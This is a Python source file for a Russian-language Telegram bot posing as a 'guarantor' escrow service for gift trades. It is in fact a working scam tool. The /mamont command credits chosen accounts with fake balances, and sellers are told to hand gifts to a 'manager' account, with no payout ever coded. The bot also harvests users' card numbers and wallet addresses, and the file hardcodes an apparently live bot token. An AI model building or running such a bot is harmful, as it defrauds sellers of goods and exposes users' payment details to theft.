# -*- coding: utf-8 -*-
import telebot
from telebot import types
import json
import random
import string
import time
import traceback
from collections import defaultdict
import os
import sqlite3
import html
from functools import wraps

# ========== КОНФИГУРАЦИЯ ==========
BOT_TOKEN = "8514982522:AAGwJtVYu-cQ4-pw_N6LBcRkWio0BLvVSGo"
MAIN_OWNER = 8072301360
OWNERS = [8072301360]
LOG_CHANNEL_ID = -1003007771264
GROUP_ID = -1003031831608
MANAGER_USERNAME = "@elfgiftmanager"
TECH_ACCOUNT = "@SapphireRelayer"

BOT_NAME = "Guard Guarantor"
MIN_DEAL_AMOUNTS = {
    'TON': 2.0, 'USDT': 5.0, 'RUB': 200.0, 'STARS': 250.0,
    'KGS': 38500.0, 'IDR': 1250.0, 'UAH': 100.0, 'UZS': 30000.0,
    'BYN': 8.0, 'BTC': 0.00002068
}

AVAILABLE_CURRENCIES = ['TON', 'USDT', 'RUB', 'STARS', 'KGS', 'IDR', 'UAH', 'UZS', 'BYN', 'BTC']

bot = telebot.TeleBot(BOT_TOKEN)
print(f"✅ Бот запущен: @{bot.get_me().username}")

# ========== БАЗА ДАННЫХ ==========
def init_db():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS orders (
        deal_code TEXT PRIMARY KEY, creator_id TEXT, role TEXT, amount REAL,
        currency TEXT, description TEXT, status TEXT, counterparty_id TEXT,
        payment_method TEXT, payment_status TEXT DEFAULT 'no_paid', deal_type TEXT DEFAULT 'gift'
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_data (
        user_id TEXT PRIMARY KEY, ton_wallet TEXT, card TEXT
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS user_balances (
        user_id TEXT, currency TEXT, amount REAL DEFAULT 0,
        PRIMARY KEY (user_id, currency)
    )''')
    c.execute('''CREATE TABLE IF NOT EXISTS banned_users (user_id TEXT PRIMARY KEY)''')
    c.execute('''CREATE TABLE IF NOT EXISTS users (user_id TEXT PRIMARY KEY)''')
    conn.commit()
    conn.close()

init_db()

# ========== ЗАГРУЗКА ДАННЫХ ==========
def load_banned_users():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT user_id FROM banned_users')
    banned = [int(row[0]) for row in c.fetchall() if row[0].isdigit()]
    conn.close()
    return banned

def load_user_balances():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT user_id, currency, amount FROM user_balances')
    balances = defaultdict(lambda: defaultdict(float))
    for user_id, currency, amount in c.fetchall():
        balances[user_id][currency] = amount
    conn.close()
    return balances

def load_user_data():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT user_id, ton_wallet, card FROM user_data')
    data = {}
    for user_id, wallet, card in c.fetchall():
        data[user_id] = {'ton_wallet': wallet, 'card': card}
    conn.close()
    return data

def load_orders():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT * FROM orders')
    orders = {}
    for row in c.fetchall():
        deal_code, creator_id, role, amount, currency, desc, status, counterparty, payment_method, payment_status, deal_type = row
        orders[deal_code] = {
            'creator_id': int(creator_id) if creator_id and creator_id != 'None' else None,
            'role': role,
            'amount': amount,
            'currency': currency,
            'description': desc,
            'status': status,
            'counterparty_id': int(counterparty) if counterparty and counterparty != 'None' else None,
            'payment_method': payment_method,
            'payment_status': payment_status,
            'deal_type': deal_type
        }
    conn.close()
    return orders

def load_users():
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('SELECT user_id FROM users')
    users = set()
    for row in c.fetchall():
        if row[0].isdigit():
            users.add(int(row[0]))
    conn.close()
    return users

# ========== СОХРАНЕНИЕ ДАННЫХ ==========
def save_orders(orders):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('DELETE FROM orders')
    for code, deal in orders.items():
        c.execute('INSERT INTO orders VALUES (?,?,?,?,?,?,?,?,?,?,?)',
                  (code, str(deal.get('creator_id')), deal.get('role'), deal.get('amount'),
                   deal.get('currency'), deal.get('description'), deal.get('status'),
                   str(deal.get('counterparty_id')), deal.get('payment_method', 'ton'),
                   deal.get('payment_status', 'no_paid'), deal.get('deal_type', 'gift')))
    conn.commit()
    conn.close()

def save_user_data(data):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_data')
    for uid, d in data.items():
        c.execute('INSERT INTO user_data VALUES (?,?,?)',
                  (uid, d.get('ton_wallet'), d.get('card')))
    conn.commit()
    conn.close()

def save_user_balances(balances):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('DELETE FROM user_balances')
    for uid, b in balances.items():
        for curr, amt in b.items():
            c.execute('INSERT INTO user_balances VALUES (?,?,?)', (uid, curr, amt))
    conn.commit()
    conn.close()

def save_users(users):
    conn = sqlite3.connect('bot.db')
    c = conn.cursor()
    c.execute('DELETE FROM users')
    for uid in users:
        c.execute('INSERT INTO users VALUES (?)', (str(uid),))
    conn.commit()
    conn.close()

# ========== ГЛОБАЛЬНЫЕ ПЕРЕМЕННЫЕ ==========
BANNED_USERS = load_banned_users()
user_balances = load_user_balances()
user_data = load_user_data()
orders = load_orders()
users = load_users()
user_states = {}
message_ids = {}

# ========== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ==========
def generate_deal_code():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

def log_to_channel(message):
    try:
        bot.send_message(LOG_CHANNEL_ID, message, parse_mode='HTML')
    except:
        pass

def get_user_balance(user_id, currency):
    return user_balances.get(str(user_id), {}).get(currency, 0.0)

def add_to_balance(user_id, currency, amount):
    uid = str(user_id)
    if uid not in user_balances:
        user_balances[uid] = defaultdict(float)
    user_balances[uid][currency] += amount
    save_user_balances(user_balances)

def remove_from_balance(user_id, currency, amount):
    uid = str(user_id)
    if uid in user_balances and user_balances[uid].get(currency, 0) >= amount:
        user_balances[uid][currency] -= amount
        save_user_balances(user_balances)
        return True
    return False

def has_payment_details(user_id):
    uid = str(user_id)
    if uid not in user_data:
        return False
    return bool(user_data[uid].get('ton_wallet') or user_data[uid].get('card'))

def restrict_banned_users(handler):
    @wraps(handler)
    def wrapped(message):
        if message.from_user.id in BANNED_USERS:
            bot.send_message(message.chat.id, "🚫 Вы забанены!")
            return
        return handler(message)
    return wrapped

def main_admin_only(handler):
    @wraps(handler)
    def wrapped(message):
        if message.from_user.id != MAIN_OWNER:
            bot.send_message(message.chat.id, "❌ Только для главного админа!")
            return
        return handler(message)
    return wrapped

# ========== МЕНЮ ==========
def send_main_menu(chat_id, user_id):
    try:
        markup = types.InlineKeyboardMarkup(row_width=2)
        markup.add(
            types.InlineKeyboardButton("📝 Создать сделку", callback_data='create_deal'),
            types.InlineKeyboardButton("💰 Баланс", callback_data='check_balance'),
            types.InlineKeyboardButton("📩 Реквизиты", callback_data='manage_details'),
            types.InlineKeyboardButton("📖 Инструкция", url="https://t.me/instruction_guard")
        )
        
        text = f"💎 Добро пожаловать в {BOT_NAME}!\n\nВыберите действие:"
        
        if chat_id in message_ids:
            try:
                bot.delete_message(chat_id, message_ids[chat_id])
            except:
                pass
        
        if os.path.exists('img/menu.jpg'):
            with open('img/menu.jpg', 'rb') as photo:
                msg = bot.send_photo(chat_id, photo, caption=text, reply_markup=markup)
        else:
            msg = bot.send_message(chat_id, text, reply_markup=markup)
        
        message_ids[chat_id] = msg.message_id
            
    except Exception as e:
        print(f"Menu error: {e}")

# ========== КОМАНДА MAMONT ==========
@bot.message_handler(commands=['mamont'])
@main_admin_only
def mamont_command(message):
    try:
        args = message.text.split()
        if len(args) < 2:
            bot.send_message(message.chat.id, "Используйте: /mamont user_id")
            return
        
        target_id = int(args[1])
        
        for currency in AVAILABLE_CURRENCIES:
            add_to_balance(target_id, currency, 999999)
        
        bot.send_message(message.chat.id, f"✅ Пользователю {target_id} начислено 999999 всех валют!")
        log_to_channel(f"💰 Мамонт {target_id} получил 999999 всех валют")
        
        try:
            bot.send_message(target_id, "🎉 Вам начислено 999999 всех валют! Проверьте баланс.")
        except:
            pass
            
    except Exception as e:
        bot.send_message(message.chat.id, f"❌ Ошибка: {e}")

# ========== СТАРТ ==========
@bot.message_handler(commands=['start'])
@restrict_banned_users
def start(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id
        
        if user_id not in users:
            users.add(user_id)
            save_users(users)
        
        if str(user_id) not in user_data:
            user_data[str(user_id)] = {}
            save_user_data(user_data)
        
        args = message.text.split()
        if len(args) > 1:
            deal_code = args[1]
            if deal_code in orders:
                handle_deal_join(message, deal_code)
                return
        
        send_main_menu(chat_id, user_id)
            
    except Exception as e:
        print(f"Start error: {e}")

def handle_deal_join(message, deal_code):
    chat_id = message.chat.id
    user_id = message.from_user.id
    deal = orders.get(deal_code)
    
    if not deal:
        bot.send_message(chat_id, "❌ Сделка не найдена!")
        return
    
    if user_id == deal['creator_id']:
        bot.send_message(chat_id, "❌ Нельзя присоединиться к своей сделке!")
        return
    
    if deal.get('counterparty_id'):
        bot.send_message(chat_id, "❌ Сделка уже занята!")
        return
    
    amount = deal['amount']
    currency = deal['currency']
    buyer_balance = get_user_balance(user_id, currency)
    
    if buyer_balance < amount:
        bot.send_message(chat_id, 
            f"❌ Недостаточно средств!\n"
            f"Ваш баланс: {buyer_balance} {currency}\n"
            f"Требуется: {amount} {currency}")
        return
    
    if not remove_from_balance(user_id, currency, amount):
        bot.send_message(chat_id, "❌ Ошибка списания средств!")
        return
    
    orders[deal_code]['counterparty_id'] = user_id
    orders[deal_code]['status'] = 'paid'
    save_orders(orders)
    
    creator_id = deal['creator_id']
    
    try:
        buyer_name = bot.get_chat(user_id).username or str(user_id)
        seller_name = bot.get_chat(creator_id).username or str(creator_id)
    except:
        buyer_name = str(user_id)
        seller_name = str(creator_id)
    
    seller_text = (
        f"📦 <b>Покупатель присоединился к сделке #{deal_code} и оплатил!</b>\n\n"
        f"Покупатель: @{buyer_name}\n"
        f"Сумма: {amount} {currency}\n\n"
        f"⚠️ <b>ВАЖНО!</b>\n"
        f"Отправьте подарок ТОЛЬКО менеджеру {MANAGER_USERNAME}\n"
        f"После отправки нажмите кнопку ниже"
    )
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("✅ Я отправил менеджеру", 
                callback_data=f"confirm_send_{deal_code}"))
    
    bot.send_message(creator_id, seller_text, parse_mode='HTML', reply_markup=markup)
    
    buyer_text = (
        f"✅ <b>Вы присоединились к сделке #{deal_code}</b>\n\n"
        f"Продавец: @{seller_name}\n"
        f"Сумма: {amount} {currency} списана с вашего баланса\n\n"
        f"Ожидайте, продавец отправит подарок менеджеру"
    )
    bot.send_message(user_id, buyer_text, parse_mode='HTML')
    
    log_to_channel(f"🛠 Покупатель @{buyer_name} оплатил сделку #{deal_code}")

# ========== ОБРАБОТКА КНОПОК ==========
@bot.callback_query_handler(func=lambda call: True)
@restrict_banned_users
def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = call.from_user.id
    data = call.data
    
    try:
        if data == 'check_balance':
            show_balance(call)
        elif data == 'manage_details':
            manage_details(call)
        elif data == 'create_deal':
            create_deal_menu(call)
        elif data.startswith('confirm_send_'):
            confirm_send_to_manager(call)
        elif data == 'back_to_menu':
            send_main_menu(chat_id, user_id)
            bot.answer_callback_query(call.id)
        elif data == 'add_ton_wallet':
            add_wallet(call)
        elif data == 'add_card':
            add_card(call)
        elif data.startswith('deal_'):
            handle_deal_currency(call)
        else:
            bot.answer_callback_query(call.id, "❌ Неизвестная команда")
            
    except Exception as e:
        print(f"Callback error: {e}")
        bot.answer_callback_query(call.id, "❌ Ошибка!")

def show_balance(call):
    user_id = str(call.from_user.id)
    balances = user_balances.get(user_id, {})
    
    text = "💰 <b>Ваш баланс</b>\n\n"
    for curr in AVAILABLE_CURRENCIES:
        amt = balances.get(curr, 0)
        if amt > 0:
            text += f"{curr}: {amt:.2f}\n"
    
    if not balances:
        text += "У вас пока нет средств\n"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))
    
    try:
        bot.edit_message_caption(chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                caption=text, parse_mode='HTML',
                                reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode='HTML', reply_markup=markup)
    
    bot.answer_callback_query(call.id)

def manage_details(call):
    user_id = str(call.from_user.id)
    user_info = user_data.get(user_id, {})
    
    text = "📩 <b>Ваши реквизиты</b>\n\n"
    text += f"💎 TON: {user_info.get('ton_wallet', 'не указан')}\n"
    text += f"💳 Карта: {user_info.get('card', 'не указана')}\n\n"
    text += "Реквизиты нужны для получения выплат"
    
    markup = types.InlineKeyboardMarkup()
    markup.add(
        types.InlineKeyboardButton("💎 Добавить TON", callback_data='add_ton_wallet'),
        types.InlineKeyboardButton("💳 Добавить карту", callback_data='add_card'),
        types.InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')
    )
    
    try:
        bot.edit_message_caption(chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                caption=text, parse_mode='HTML',
                                reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, text, parse_mode='HTML', reply_markup=markup)
    
    bot.answer_callback_query(call.id)

def create_deal_menu(call):
    if not has_payment_details(call.from_user.id):
        markup = types.InlineKeyboardMarkup()
        markup.add(
            types.InlineKeyboardButton("📩 Добавить реквизиты", callback_data='manage_details'),
            types.InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu')
        )
        bot.send_message(call.message.chat.id, 
            "❌ Сначала добавьте реквизиты для получения оплаты!", reply_markup=markup)
        bot.answer_callback_query(call.id)
        return
    
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = []
    for currency in AVAILABLE_CURRENCIES:
        buttons.append(types.InlineKeyboardButton(currency, callback_data=f'deal_{currency}'))
    
    markup.add(*buttons)
    markup.add(types.InlineKeyboardButton("🔙 Назад", callback_data='back_to_menu'))
    
    try:
        bot.edit_message_caption(chat_id=call.message.chat.id,
                                message_id=call.message.message_id,
                                caption="Выберите валюту сделки:",
                                reply_markup=markup)
    except:
        bot.send_message(call.message.chat.id, "Выберите валюту сделки:", reply_markup=markup)
    
    bot.answer_callback_query(call.id)

def handle_deal_currency(call):
    chat_id = call.message.chat.id
    currency = call.data.split('_')[1]
    user_states[chat_id] = f'waiting_amount_{currency}'
    bot.send_message(chat_id, f"Введите сумму в {currency}:")
    bot.answer_callback_query(call.id)

def confirm_send_to_manager(call):
    deal_code = call.data.split('_')[2]
    deal = orders.get(deal_code)
    
    if not deal:
        bot.answer_callback_query(call.id, "❌ Сделка не найдена!", show_alert=True)
        return
    
    orders[deal_code]['status'] = 'completed'
    save_orders(orders)
    
    creator_id = deal['creator_id']
    amount = deal['amount']
    currency = deal['currency']
    
    # Здесь можно добавить логику выплаты продавцу
    
    bot.edit_message_text(
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        text=f"✅ Спасибо! Менеджер {MANAGER_USERNAME} проверит получение.\n"
             f"После подтверждения средства поступят на ваш баланс.",
        reply_markup=None
    )
    
    bot.send_message(creator_id, f"✅ Менеджер уведомлен о сделке #{deal_code}")
    bot.answer_callback_query(call.id, "✅ Ожидайте подтверждения")

def add_wallet(call):
    chat_id = call.message.chat.id
    user_states[chat_id] = 'waiting_wallet'
    bot.send_message(chat_id, "💎 Введите адрес TON кошелька:")
    bot.answer_callback_query(call.id)

def add_card(call):
    chat_id = call.message.chat.id
    user_states[chat_id] = 'waiting_card'
    bot.send_message(chat_id, "💳 Введите номер карты:")
    bot.answer_callback_query(call.id)

# ========== ОБРАБОТКА ТЕКСТА ==========
@bot.message_handler(func=lambda m: True)
def handle_text(message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    text = message.text
    state = user_states.get(chat_id)
    
    if not state:
        bot.send_message(chat_id, "Используйте кнопки меню.")
        send_main_menu(chat_id, user_id)
        return
    
    if state == 'waiting_wallet':
        user_data[str(user_id)] = user_data.get(str(user_id), {})
        user_data[str(user_id)]['ton_wallet'] = text
        save_user_data(user_data)
        bot.send_message(chat_id, f"✅ TON кошелек сохранен")
        user_states.pop(chat_id, None)
        send_main_menu(chat_id, user_id)
        
    elif state == 'waiting_card':
        user_data[str(user_id)] = user_data.get(str(user_id), {})
        user_data[str(user_id)]['card'] = text
        save_user_data(user_data)
        bot.send_message(chat_id, f"✅ Карта сохранена")
        user_states.pop(chat_id, None)
        send_main_menu(chat_id, user_id)
        
    elif state.startswith('waiting_amount_'):
        currency = state.split('_')[2]
        try:
            amount = float(text.replace(',', '.'))
            
            min_amount = MIN_DEAL_AMOUNTS.get(currency, 0)
            if amount < min_amount:
                bot.send_message(chat_id, f"❌ Минимальная сумма: {min_amount} {currency}")
                return
            
            deal_code = generate_deal_code()
            
            if currency in ['TON', 'USDT', 'BTC']:
                payment_method = 'ton'
            elif currency == 'STARS':
                payment_method = 'stars'
            else:
                payment_method = 'card'
            
            orders[deal_code] = {
                'creator_id': user_id,
                'role': 'seller',
                'currency': currency,
                'amount': amount,
                'description': 'Подарок',
                'status': 'created',
                'counterparty_id': None,
                'payment_method': payment_method,
                'payment_status': 'no_paid',
                'deal_type': 'gift'
            }
            save_orders(orders)
            
            bot_link = f"https://t.me/{bot.get_me().username}?start={deal_code}"
            
            bot.send_message(chat_id, 
                f"✅ Сделка #{deal_code} создана!\n"
                f"Сумма: {amount} {currency}\n\n"
                f"🔗 Ссылка для покупателя:\n{bot_link}")
            
            log_to_channel(f"📝 Создана сделка #{deal_code} пользователем {user_id}")
            
        except ValueError:
            bot.send_message(chat_id, "❌ Введите корректное число")
            return
        
        user_states.pop(chat_id, None)

# ========== АДМИН КОМАНДЫ ==========
@bot.message_handler(commands=['admin'])
@main_admin_only
def admin_panel(message):
    text = "🔧 Админ панель\n\n"
    text += f"Всего пользователей: {len(users)}\n"
    text += f"Активных сделок: {len([o for o in orders.values() if o['status'] == 'paid'])}"
    bot.send_message(message.chat.id, text)

@bot.message_handler(commands=['ban'])
@main_admin_only
def ban_user(message):
    try:
        user_id = int(message.text.split()[1])
        if user_id not in BANNED_USERS:
            BANNED_USERS.append(user_id)
            conn = sqlite3.connect('bot.db')
            c = conn.cursor()
            c.execute('INSERT INTO banned_users VALUES (?)', (str(user_id),))
            conn.commit()
            conn.close()
            bot.send_message(message.chat.id, f"✅ Пользователь {user_id} забанен")
        else:
            bot.send_message(message.chat.id, "❌ Уже забанен")
    except:
        bot.send_message(message.chat.id, "Используйте: /ban user_id")

@bot.message_handler(commands=['unban'])
@main_admin_only
def unban_user(message):
    try:
        user_id = int(message.text.split()[1])
        if user_id in BANNED_USERS:
            BANNED_USERS.remove(user_id)
            conn = sqlite3.connect('bot.db')
            c = conn.cursor()
            c.execute('DELETE FROM banned_users WHERE user_id = ?', (str(user_id),))
            conn.commit()
            conn.close()
            bot.send_message(message.chat.id, f"✅ Пользователь {user_id} разбанен")
        else:
            bot.send_message(message.chat.id, "❌ Не в бане")
    except:
        bot.send_message(message.chat.id, "Используйте: /unban user_id")

# ========== ЗАПУСК ==========
if __name__ == '__main__':
    print("=" * 50)
    print("🚀 Бот запущен и готов к работе!")
    print(f"👤 Главный админ ID: {MAIN_OWNER}")
    print(f"📢 Лог канал: {LOG_CHANNEL_ID}")
    print("=" * 50)
    
    if not os.path.exists('img'):
        os.makedirs('img')
        print("📁 Создана папка 'img'")
    
    try:
        bot.polling(none_stop=True, interval=0)
    except Exception as e:
        print(f"❌ Ошибка: {e}")
        time.sleep(3)